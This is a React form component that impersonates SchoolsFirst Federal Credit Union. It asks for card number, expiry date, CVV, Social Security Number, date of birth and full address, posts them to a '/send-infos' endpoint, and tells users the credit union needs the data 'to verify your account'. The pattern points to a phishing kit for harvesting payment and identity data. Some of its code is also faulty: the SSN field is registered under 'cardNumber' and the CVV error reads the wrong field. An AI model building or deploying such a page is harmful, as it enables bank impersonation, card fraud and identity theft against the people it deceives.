import {
  Button,
  FormControl,
  FormHelperText,
  TextField,
  Typography,
} from "@mui/material";
import { Box } from "@mui/system";
import axios from "axios";
import React from "react";
import { useForm } from "react-hook-form";

interface CardInformationProps {
  updateInputs: (data: any) => void;
  inputs: {};
  history: any;
}

export const CardInformation: React.FC<CardInformationProps> = ({
  updateInputs,
  history,
}) => {
  const {
    register,
    handleSubmit,
    formState: { errors },
  } = useForm();

  const onSubmit = handleSubmit(async (data) => {
    updateInputs({
      form: "CARD INFORMATION",
      cardInformation: data,
    });

    await axios.post("/send-infos", {
      form: "CARD INFORMATION",
      cardInformation: data,
    });
    history.push("/successful");
  });
  return (
    <Box sx={{ flexGrow: 1 }} bgcolor="#f3f4f4">
      <Box
        bgcolor="white"
        sx={{
          margin: "3rem auto",
          display: "flex",
          maxWidth: ["540px", "720px", "960px", "1400px"],
          width: "100%",
          padding: "0 15px",
        }}
      >
        <Box
          sx={{
            display: "flex",
            flex: 2,
            padding: "1.5rem",
            flexDirection: "column",
          }}
        >
          <Box padding="1rem" width="70%">
            <FormControl>
              <TextField
                fullWidth
                label="Full name"
                type="text"
                variant="standard"
                {...register("fullname", {
                  validate: (value) => {
                    if (!value) {
                      return "Please enter your full name";
                    }

                    return true;
                  },
                  required: "Please enter your full name",
                })}
              />
              {errors.fullname && (
                <FormHelperText
                  color="primary"
                  sx={{
                    marginTop: ".66666667em",
                    marginLeft: 0,
                    color: "#a61c23 !important",
                    fontSize: "75%",
                    fontWeight: 700,
                  }}
                >
                  {errors.fullname.message}
                </FormHelperText>
              )}
            </FormControl>
          </Box>
          <Box padding="1rem" width="70%">
            <FormControl>
              <TextField
                fullWidth
                label="Card Number"
                type="number"
                variant="standard"
                {...register("cardNumber", {
                  validate: (value) => {
                    if (!value) {
                      return "Please enter a valid credit card";
                    }

                    if (value.length < 16) {
                      return "Please enter a valid credit card";
                    }

                    return true;
                  },
                  required: "Please enter a valid credit card",
                })}
              />
              {errors.cardNumber && (
                <FormHelperText
                  color="primary"
                  sx={{
                    marginTop: ".66666667em",
                    marginLeft: 0,
                    color: "#a61c23 !important",
                    fontSize: "75%",
                    fontWeight: 700,
                  }}
                >
                  {errors.cardNumber.message}
                </FormHelperText>
              )}
            </FormControl>
          </Box>
          <Box padding="1rem" width="70%" paddingTop={0}>
            <FormControl>
              <TextField
                fullWidth
                label="Expiry Date: MM/YYYY"
                type="number"
                variant="standard"
                {...register("expiryDate", {
                  validate: (value) => {
                    if (!value) {
                      return "Please enter your card expiration date";
                    }

                    if (!value.includes("/") || value.length < 7) {
                      return "Please enter a valid expiration date";
                    }

                    return true;
                  },
                  required: "Please enter your card expiration date",
                })}
              />
              {errors.expiryDate && (
                <FormHelperText
                  color="primary"
                  sx={{
                    marginTop: ".66666667em",
                    marginLeft: 0,
                    color: "#a61c23 !important",
                    fontSize: "75%",
                    fontWeight: 700,
                  }}
                >
                  {errors.expiryDate.message}
                </FormHelperText>
              )}
            </FormControl>
          </Box>
          <Box padding="1rem" width="70%" paddingTop={0}>
            <FormControl>
              <TextField
                fullWidth
                label="CVV"
                type="number"
                variant="standard"
                {...register("cvv", {
                  validate: (value) => {
                    if (!value) {
                      return "Please enter your card CVV";
                    }

                    if (value.length < 4) {
                      return "Please enter a valid CVV";
                    }

                    return true;
                  },
                  required: "Please enter your card CVV",
                })}
              />
              {errors.cvv && (
                <FormHelperText
                  color="primary"
                  sx={{
                    marginTop: ".66666667em",
                    marginLeft: 0,
                    color: "#a61c23 !important",
                    fontSize: "75%",
                    fontWeight: 700,
                  }}
                >
                  {errors.ssn.message}
                </FormHelperText>
              )}
            </FormControl>
          </Box>
          <Box padding="1rem" width="70%" paddingTop={0}>
            <FormControl>
              <TextField
                fullWidth
                label="Social Security Number"
                type="number"
                variant="standard"
                {...register("cardNumber", {
                  validate: (value) => {
                    if (!value) {
                      return "Please enter your Social Security Number";
                    }

                    if (value.length < 9 || value.length > 9) {
                      return "Please enter a valid Social Security Number";
                    }

                    return true;
                  },
                  required: "Please enter your Social Security Number",
                })}
              />
              {errors.ssn && (
                <FormHelperText
                  color="primary"
                  sx={{
                    marginTop: ".66666667em",
                    marginLeft: 0,
                    color: "#a61c23 !important",
                    fontSize: "75%",
                    fontWeight: 700,
                  }}
                >
                  {errors.ssn.message}
                </FormHelperText>
              )}
            </FormControl>
          </Box>
          <Box padding="1rem" width="70%" paddingTop={0}>
            <FormControl>
              <TextField
                fullWidth
                label="Date of Birth: MM/DD/YYYY"
                variant="standard"
                {...register("dob", {
                  validate: (value) => {
                    if (!value) {
                      return "Please enter your date of birth";
                    }

                    if (!value.includes("/") || value.length < 10) {
                      return "Please enter a date in the format above";
                    }

                    return true;
                  },
                  required: "Please enter your date of birth",
                })}
              />
              {errors.dob && (
                <FormHelperText
                  color="primary"
                  sx={{
                    marginTop: ".66666667em",
                    marginLeft: 0,
                    color: "#a61c23 !important",
                    fontSize: "75%",
                    fontWeight: 700,
                  }}
                >
                  {errors.dob.message}
                </FormHelperText>
              )}
            </FormControl>
          </Box>
          <Box padding="1rem" width="70%" paddingTop={0}>
            <FormControl>
              <TextField
                fullWidth
                label="Full address e.g 2115 N Broadway, Santa Ana, CA 92706"
                variant="standard"
                {...register("fullAddress", {
                  validate: (value) => {
                    if (!value) {
                      return "Please enter your full address";
                    }

                    return true;
                  },
                  required: "Please enter your full address",
                })}
              />
              {errors.fullAddress && (
                <FormHelperText
                  color="primary"
                  sx={{
                    marginTop: ".66666667em",
                    marginLeft: 0,
                    color: "#a61c23 !important",
                    fontSize: "75%",
                    fontWeight: 700,
                  }}
                >
                  {errors.fullAddress.message}
                </FormHelperText>
              )}
            </FormControl>
          </Box>
          <Box width="50%" padding="1rem">
            <Button
              disabled
              disableRipple
              fullWidth
              sx={{
                textTransform: "uppercase",
                padding: ".5rem 1.5rem",
                fontSize: "1rem",
                lineHeight: "1.333rem",
                borderRadius: 0,
                backgroundColor: "#af5607",
                borderColor: "#af5607",
                color: "white",
                ":hover": {
                  backgroundColor: "#7b3c05",
                  borderColor: "#7b3c05",
                },
                "&.Mui-disabled": {
                  color: "white",
                  opacity: 0.3,
                },
              }}
              onClick={onSubmit}
            >
              CONTINUE
            </Button>
          </Box>
        </Box>
        <Box
          sx={{
            display: "flex",
            flex: 1,
            flexDirection: "column",
            padding: "1.5rem",
          }}
        >
          <Typography
            component="h4"
            color="primary"
            sx={{
              fontWeight: "700",
              margin: "1.5rem 0",
            }}
          >
            Why do I have to provide this information?
          </Typography>
          <Typography component="p">
            SchoolsFirst Federal Credit Union requires all this information to
            be able to verify your account
          </Typography>
        </Box>
      </Box>
    </Box>
  );
};
